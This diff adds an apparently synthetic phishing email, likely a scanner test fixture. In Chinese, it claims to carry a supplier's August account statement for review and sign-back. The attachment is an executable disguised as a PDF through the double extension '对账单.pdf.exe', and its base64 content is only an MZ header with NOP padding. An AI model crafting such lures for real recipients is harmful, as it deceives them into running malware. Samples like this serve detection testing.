@@ -1,0 +1,19 @@
+From: =?utf-8?B?6LSi5YqhLeW6lOS7mA==?= <ap@yy-supply.example>
+To: ap@corp.internal
+Date: Tue, 25 Aug 2026 10:35:00 +0800
+Message-ID: <0015-b2@synth.example>
+Subject: 对账单电子版
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="BS"
+
+--BS
+Content-Type: text/plain; charset=utf-8
+
+8月对账单见附件，核对后回签。
+--BS
+Content-Type: application/octet-stream
+Content-Disposition: attachment; filename="对账单.pdf.exe"
+Content-Transfer-Encoding: base64
+
+TVqQAJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQ
+--BS--
